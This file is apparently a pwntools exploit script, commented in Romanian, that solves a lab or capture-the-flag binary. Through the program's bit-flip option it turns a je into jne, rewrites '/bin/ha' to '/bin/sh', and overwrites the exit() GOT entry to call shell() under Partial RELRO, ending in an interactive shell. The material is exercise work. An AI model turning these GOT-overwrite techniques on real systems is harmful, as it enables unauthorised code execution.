from pwn import *

'''
    objdump -d ./bin/ex2 | grep je
    40143b:       74 0a                   je     401447 <flip_bit+0x47>
    jne are codul 75

    search /bin/ha
    ex2             0x40209d 0x61682f6e69622f /* '/bin/ha' */
    &"/" in "/bin/ha" este 0x40209d
    &"h" = 0x4020a2
    &"a" = 0x4020a3
    h = 01101000; a = 01100001; s = 01110011
'''

target = process("./bin/ex2")

# FLIP multiplu
target.sendline(b"1")
# adresa = je; lsb modificat => cod 75
target.sendline(b"40143b")
target.sendline(b"0")

# adresa pt "h" + modif bitii 0, 1, 3 si 4 => "s"
target.sendline(b"1")
target.sendline(b"4020a2")
target.sendline(b"0")
target.sendline(b"1")
target.sendline(b"4020a2")
target.sendline(b"1")
target.sendline(b"1")
target.sendline(b"4020a2")
target.sendline(b"3")
target.sendline(b"1")
target.sendline(b"4020a2")
target.sendline(b"4")

# adresa pt "a" => "h", modif bitii 0 si 3
target.sendline(b"1")
target.sendline(b"4020a3")
target.sendline(b"0")
target.sendline(b"1")
target.sendline(b"4020a3")
target.sendline(b"3")

# apel shell()
'''
pwndbg> p &shell
$2 = (void (*)()) 0x401523 <shell>

[0x404058] exit@GLIBC_2.2.5 -> 0x4010e0 ◂— endbr64 

0x404058:
0x4010e0 = 0100 0000 0001 0000 1110 0000 => 58: bitii 0/1/6/7; 59 => bitii 0/2; 5a => nimic
0x401523 = 0100 0000 0001 0101 0010 0011
'''
# modif in GOT exit() => shell() pt ca avem Partial RELRO
target.sendline(b"1")
target.sendline(b"404058")
target.sendline(b"0")
target.sendline(b"1")
target.sendline(b"404058")
target.sendline(b"1")
target.sendline(b"1")
target.sendline(b"404058")
target.sendline(b"6")
target.sendline(b"1")
target.sendline(b"404058")
target.sendline(b"7")

target.sendline(b"1")
target.sendline(b"404059")
target.sendline(b"0")
target.sendline(b"1")
target.sendline(b"404059")
target.sendline(b"2")

# 2 pt optiunea exit(0) => se ignora argumentul pt ca nu folosim deloc rdi
target.sendline(b"2")

target.interactive()